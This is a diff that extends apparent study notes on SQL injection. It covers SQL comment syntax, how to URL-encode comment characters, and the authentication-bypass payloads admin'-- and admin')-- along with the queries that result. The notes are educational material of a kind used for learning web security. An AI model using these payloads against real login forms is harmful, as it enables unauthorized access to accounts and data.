@@ -29,7 +29,46 @@ SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password = 'someth
 # The additional OR statement makes the password field evaluate as true, because 1=1 is always true.
 ```
 Using Comments
-3 types of comments ``` --```,``` #``` and inline comments ```/**/```(Inline comments are not frequently used in injection
+3 types of comments ```--```,```#``` and inline comments ```/**/```(Inline comments are not frequently used in injection)
+```sql
+# Example "-- "
+SELECT username FROM logins; -- Selects usernames from the logins table
+
+# NOTE: 2 dashes are not enough to start a comment. There has to be space at the end. The empty space cannot be passed in a
+# URL. Use (+) to url encode an empty space
+```
+```sql
+# Example "#"
+SELECT username FROM logins; # Selects usernames from the logins table
+# Note: # will not be passed in a URL. It has to be URL encoded as '%23'
+```
+```sql
+# Using comment for auth bypass
+# Injected Code "admin'-- " as the username
+SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
+# Everything after the '-- ' is commented out, and as long as the username match's in SQL, the query will return true
+```
+Paranthetical evaulations
+Evals in Parantheses are always evaluated first  
+Let's take the following:
+```sql
+SELECT * FROM logins WHERE (username='admin' and id>1)AND password = 'hashed password';
+```
+The query above ensures that the users ID is always greater than 1. 
+Logging in with 'Admin' and the correct password will still fail if the admin has an id = 1
+Logging in with user 'Tom' and toms correct password will result in a successful login
+Attempting to just comment out the rest of the query will result in a syntax error.
+```sql
+SELECT * FROM logins WHERE (username='admin'-- ' and ID>1) AND password = 'hashed password';
+# This results in a syntax error because as you can see from the highlighting, you didn't close out the paranthesis
+```
+The solution is to adjust your syntax to close out the parenthesis
+Injected Code: admin')-- 
+```sql
+# Resulting query
+SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password = 'hashed password';
+# As you can see, we properly closed the parenthesis, and commented out the rest of the query, thus returning true
+```
 ## In-Band
 ### Summary
 Output of both the intended and new query are output directly to the screen and can be directly read.
